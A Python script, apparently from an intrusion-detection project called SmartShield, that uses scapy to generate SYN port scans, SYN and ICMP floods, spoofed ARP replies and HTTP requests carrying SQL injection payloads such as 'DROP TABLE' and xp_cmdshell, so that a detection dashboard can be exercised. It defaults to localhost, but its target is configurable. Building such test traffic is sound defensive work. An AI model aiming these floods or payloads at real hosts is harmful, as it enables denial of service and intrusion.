#!/usr/bin/env python3
"""
SmartShield Attack Simulator
Generates various attack patterns for real-time demonstration and testing
"""

from scapy.all import *
import time
import random
import threading
import sys
import os

# Configuration
TARGET_IP = "127.0.0.1"  # Localhost for safe testing
INTERFACE = None  # Auto-detect

class AttackSimulator:
    def __init__(self, target_ip=TARGET_IP, interface=None):
        self.target_ip = target_ip
        self.interface = interface
        self.running = False
        
    def port_scan_attack(self, duration=10):
        """Simulate port scanning - rapid connections to multiple ports"""
        print(f"[ATTACK] 🔍 Starting Port Scan Attack for {duration}s...")
        ports = [22, 80, 443, 3306, 5432, 8080, 3389, 5900, 1433, 1521, 21, 23, 25, 135, 139, 445]
        
        start_time = time.time()
        packet_count = 0
        while time.time() - start_time < duration and self.running:
            for port in ports:
                # SYN scan pattern - typical reconnaissance attack
                packet = IP(dst=self.target_ip, ttl=random.randint(50, 64)) / \
                         TCP(dport=port, sport=random.randint(49152, 65535), flags="S", 
                             seq=random.randint(1000000, 9999999), window=random.randint(1000, 65535))
                send(packet, verbose=0, iface=self.interface)
                packet_count += 1
                time.sleep(0.01)  # Rapid scanning
            time.sleep(0.1)
        print(f"[ATTACK] ✅ Port Scan Attack completed - {packet_count} packets sent")
    
    def ddos_flood_attack(self, duration=5):
        """Simulate DDoS - high packet rate flooding"""
        print(f"[ATTACK] 🌊 Starting DDoS Flood Attack for {duration}s...")
        start_time = time.time()
        packet_count = 0
        
        while time.time() - start_time < duration and self.running:
            # Flood with TCP SYN packets - high rate
            packet = IP(dst=self.target_ip, ttl=random.randint(50, 64), 
                       len=random.randint(40, 1500)) / \
                     TCP(dport=random.randint(80, 8080), 
                         sport=random.randint(49152, 65535),
                         flags="S", 
                         seq=random.randint(1000, 999999),
                         window=random.randint(1000, 65535))
            send(packet, verbose=0, iface=self.interface)
            packet_count += 1
            if packet_count % 100 == 0:
                print(f"  📊 Sent {packet_count} packets...")
        
        print(f"[ATTACK] ✅ DDoS Flood completed - {packet_count} packets sent ({packet_count/duration:.0f} pps)")
    
    def sql_injection_attack(self, duration=8):
        """Simulate SQL injection via HTTP"""
        print(f"[ATTACK] 💉 Starting SQL Injection Attack for {duration}s...")
        malicious_payloads = [
            "UNION SELECT * FROM users--",
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin'--",
            "1' UNION SELECT NULL--",
            "' OR 1=1--",
            "admin' OR '1'='1",
            "'; EXEC xp_cmdshell('dir')--"
        ]
        
        start_time = time.time()
        packet_count = 0
        while time.time() - start_time < duration and self.running:
            payload = random.choice(malicious_payloads)
            # Create HTTP-like packet with malicious payload
            http_payload = f"GET /login.php?user={payload} HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
            packet = IP(dst=self.target_ip, ttl=64, len=len(http_payload) + 40) / \
                     TCP(dport=80, sport=random.randint(49152, 65535), flags="PA", 
                         seq=random.randint(1000000, 9999999)) / \
                     Raw(load=http_payload)
            send(packet, verbose=0, iface=self.interface)
            packet_count += 1
            time.sleep(0.3)
        print(f"[ATTACK] ✅ SQL Injection Attack completed - {packet_count} malicious packets sent")
    
    def suspicious_port_scan(self, duration=7):
        """Scan unusual/privileged ports - suspicious behavior"""
        print(f"[ATTACK] 🚨 Starting Suspicious Port Scan for {duration}s...")
        suspicious_ports = [21, 23, 25, 135, 139, 445, 1433, 3306, 5432, 1521, 3389, 5900]
        
        start_time = time.time()
        packet_count = 0
        while time.time() - start_time < duration and self.running:
            for port in suspicious_ports:
                # Unusual TTL values and window sizes
                packet = IP(dst=self.target_ip, ttl=random.randint(100, 255)) / \
                         TCP(dport=port, sport=random.randint(49152, 65535),
                             flags="S", 
                             seq=random.randint(1000000, 9999999),
                             window=random.randint(1000, 65535),
                             options=[('MSS', random.randint(100, 1500))])
                send(packet, verbose=0, iface=self.interface)
                packet_count += 1
                time.sleep(0.05)
        print(f"[ATTACK] ✅ Suspicious Port Scan completed - {packet_count} packets sent")
    
    def arp_spoofing_pattern(self, duration=6):
        """Simulate ARP spoofing patterns - unusual ARP traffic"""
        print(f"[ATTACK] 🔄 Starting ARP Spoofing Pattern for {duration}s...")
        start_time = time.time()
        packet_count = 0
        
        # Generate fake MAC addresses
        fake_mac = "00:11:22:33:44:55"
        target_mac = "ff:ff:ff:ff:ff:ff"
        
        while time.time() - start_time < duration and self.running:
            # ARP request with suspicious patterns
            packet = ARP(op=2, pdst=self.target_ip, hwdst=target_mac, 
                        psrc="192.168.1.1", hwsrc=fake_mac)
            send(packet, verbose=0, iface=self.interface)
            packet_count += 1
            time.sleep(0.2)
        print(f"[ATTACK] ✅ ARP Spoofing Pattern completed - {packet_count} packets sent")
    
    def icmp_flood(self, duration=5):
        """ICMP flood attack - ping flood"""
        print(f"[ATTACK] 📡 Starting ICMP Flood Attack for {duration}s...")
        start_time = time.time()
        packet_count = 0
        
        while time.time() - start_time < duration and self.running:
            # ICMP echo request flood
            packet = IP(dst=self.target_ip, ttl=64) / \
                     ICMP(type=8, code=0) / \
                     Raw(load=b"X" * random.randint(32, 1024))
            send(packet, verbose=0, iface=self.interface)
            packet_count += 1
            if packet_count % 50 == 0:
                print(f"  📊 Sent {packet_count} ICMP packets...")
        print(f"[ATTACK] ✅ ICMP Flood completed - {packet_count} packets sent")
    
    def run_demo_sequence(self):
        """Run a sequence of attacks for demonstration"""
        print("\n" + "="*70)
        print("🚨 SmartShield Attack Simulation Demo")
        print("="*70)
        print(f"Target: {self.target_ip}")
        print("Make sure SmartShield backend is running on port 5000")
        print("Watch the dashboard for real-time attack detection!")
        print("="*70 + "\n")
        
        self.running = True
        
        attacks = [
            ("Port Scan", self.port_scan_attack, 10),
            ("DDoS Flood", self.ddos_flood_attack, 5),
            ("SQL Injection", self.sql_injection_attack, 8),
            ("Suspicious Port Scan", self.suspicious_port_scan, 7),
            ("ICMP Flood", self.icmp_flood, 5),
        ]
        
        for i, (name, attack_func, duration) in enumerate(attacks, 1):
            print(f"\n⏱️  [{i}/{len(attacks)}] Starting: {name}")
            attack_func(duration)
            print(f"✅ {name} completed")
            if i < len(attacks):
                print("⏸️  Pausing 3 seconds before next attack...")
                time.sleep(3)
        
        self.running = False
        print("\n" + "="*70)
        print("✅ Attack simulation demo completed!")
        print("Check your SmartShield dashboard for detected attacks")
        print("="*70)

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='SmartShield Attack Simulator')
    parser.add_argument('--target', '-t', default=TARGET_IP, 
                       help='Target IP address (default: 127.0.0.1)')
    parser.add_argument('--interface', '-i', default=None,
                       help='Network interface to use')
    parser.add_argument('--attack', '-a', type=int, choices=[1,2,3,4,5,6,7],
                       help='Attack type: 1=Port Scan, 2=DDoS, 3=SQL Injection, 4=Suspicious Ports, 5=Demo Sequence, 6=Continuous, 7=ICMP Flood')
    parser.add_argument('--duration', '-d', type=int, default=10,
                       help='Attack duration in seconds (default: 10)')
    
    args = parser.parse_args()
    
    simulator = AttackSimulator(target_ip=args.target, interface=args.interface)
    
    if args.attack:
        choice = str(args.attack)
    else:
        print("\n" + "="*70)
        print("🚨 SmartShield Attack Simulator")
        print("="*70)
        print("\nSelect attack type:")
        print("1. Port Scan (reconnaissance)")
        print("2. DDoS Flood (high packet rate)")
        print("3. SQL Injection (malicious payloads)")
        print("4. Suspicious Port Scan (unusual ports)")
        print("5. Full Demo Sequence (all attacks)")
        print("6. Continuous Random Attacks")
        print("7. ICMP Flood")
        print("\n⚠️  WARNING: Only use on localhost or authorized networks!")
        print("="*70)
        
        choice = input("\nEnter choice (1-7): ").strip()
    
    simulator.running = True
    
    try:
        if choice == "1":
            simulator.port_scan_attack(args.duration)
        elif choice == "2":
            simulator.ddos_flood_attack(args.duration)
        elif choice == "3":
            simulator.sql_injection_attack(args.duration)
        elif choice == "4":
            simulator.suspicious_port_scan(args.duration)
        elif choice == "5":
            simulator.run_demo_sequence()
        elif choice == "6":
            print("🔄 Running continuous random attacks (Ctrl+C to stop)...")
            print("Watch your SmartShield dashboard for real-time detection!\n")
            try:
                while True:
                    attack_type = random.choice([
                        (simulator.port_scan_attack, "Port Scan"),
                        (simulator.ddos_flood_attack, "DDoS Flood"),
                        (simulator.sql_injection_attack, "SQL Injection"),
                        (simulator.suspicious_port_scan, "Suspicious Port Scan"),
                        (simulator.icmp_flood, "ICMP Flood")
                    ])
                    duration = random.randint(3, 8)
                    print(f"\n🎲 Random attack: {attack_type[1]} ({duration}s)")
                    attack_type[0](duration)
                    time.sleep(random.randint(2, 5))
            except KeyboardInterrupt:
                print("\n\n⏹️  Stopped by user")
        elif choice == "7":
            simulator.icmp_flood(args.duration)
        else:
            print("❌ Invalid choice")
    except KeyboardInterrupt:
        print("\n\n⏹️  Attack simulation stopped by user")
    except Exception as e:
        print(f"\n❌ Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        simulator.running = False

if __name__ == "__main__":
    # Check for root privileges
    if os.geteuid() != 0:
        print("⚠️  Warning: Running without root privileges")
        print("   Some attacks may not work properly")
        print("   Run with: sudo python3 attack_simulator.py\n")
        time.sleep(2)
    
    main()

